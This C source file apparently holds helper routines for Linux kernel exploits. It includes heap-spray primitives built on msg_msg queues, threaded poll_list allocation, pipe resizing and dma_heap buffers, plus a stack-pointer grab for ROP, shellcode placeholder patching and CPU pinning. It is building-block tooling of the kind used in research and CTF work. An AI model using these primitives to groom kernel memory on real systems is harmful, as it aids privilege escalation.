#include "helpers.h"

//
// dma_heap
//
int allocate_dma_heap(int fd, size_t len, int fd_flags, int heap_flags){
    return 0;
}

void* alloc_dma_buffer(int fd, void* address, size_t size, int flags){
    return 0;
}

//
// pipes
//
#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 0
#endif
int set_pipe_pages(int* pipe_fd, int npages){
	return fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE * npages);
}

//
// System V messages (struct msgmsg)
//
int send_msg(void* data, size_t size){
    int qid;

    // create queue
    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

    // send message
	msgsnd(qid, data, size, 0);

    return qid;
}

int read_msg(int msqid, void* data, size_t size){
    if(msgrcv(msqid, data, size, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR) < 0)
        err(1, "read_msg failed");
    return size;
}

int open_dma_heap_system(void){
    int fd = open(DMA_HEAP_SYSTEM_DEV, O_RDWR);
    if(fd == -1)
        err(1, "failed to open " DMA_HEAP_SYSTEM_DEV);
    return fd;
}

int get_dma_buf_fd(int fd, struct dma_heap_allocation_data* data){
    if(ioctl(fd, DMA_HEAP_IOCTL_ALLOC, data) < 0)
        err(1, "dma_heap ioctl failed");
    return data->fd;
}

//
// poll_list
//
size_t poll_threads;
pthread_t poll_tid[0x1000];
pthread_mutex_t pthread_mutex = PTHREAD_MUTEX_INITIALIZER;

void *__alloc_poll_list(void *args) {
    struct pollfd *pfds;
    int nfds, timeout, id, fd;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timeout = ((struct t_args *)args)->timeout;
    fd = ((struct t_args *)args)->fd;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fd;
        pfds[i].events = POLLERR;
    }

    pthread_mutex_lock(&pthread_mutex);
    poll_threads++;
    pthread_mutex_unlock(&pthread_mutex);

    // printf("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timeout);
    // printf("[Thread %d] Polling complete: %d!\n", id, ret); 
}

void create_poll_thread(int id, size_t size, int timeout, int fd) {
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timeout = timeout;
    args->fd = fd;

    pthread_create(&poll_tid[id], 0, __alloc_poll_list, (void *)args);
}

void join_poll_threads() {
    for (int i = 0; i < poll_threads; i++)
        pthread_join(poll_tid[i], NULL);
        
    poll_threads = 0;
}

void* alloc_poll_list(void* args) {
    alloc_poll_list_args_t* plargs = (alloc_poll_list_args_t *)args;

	int fd = open(plargs->filename, O_RDONLY);

	for (int i = 0; i < plargs->n; i++)
		create_poll_thread(i, plargs->size, plargs->time, fd);

	join_poll_threads();
}

//
// rop
//
static void get_valid_rsp(void **user_rsp) {
  asm(
      "movq %%rsp, %0\n"
      : "=r"(*user_rsp)
      :
      : "memory");
}

//
// shellcode
//
void replace(uint8_t* buffer, size_t buffer_sz, unsigned long to_find, unsigned long to_put){
    for(int i = 0; i < buffer_sz; ++i){
        if(*(unsigned long*)(&buffer[i]) == to_find){
            *(unsigned long*)(&buffer[i]) = to_put;
            break;
        }
    }
}

//
// debugging
//
void hlt(char* s){
    printf(INF "%s\n" "waiting for input: ", s);
    getchar();
}

void hexdump(int8_t* array, size_t sz, size_t blocksz){
    int i, j;
    for(i = 0; i < sz; i += blocksz){
        printf("%04x", i);
        for(j = i; j < min(i+blocksz, sz); ++j)
            printf("  %02hhx", array[j]);
        putchar('\n');
    }
}

//
// misc
//
void pin_cpu(void){
	cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu);
}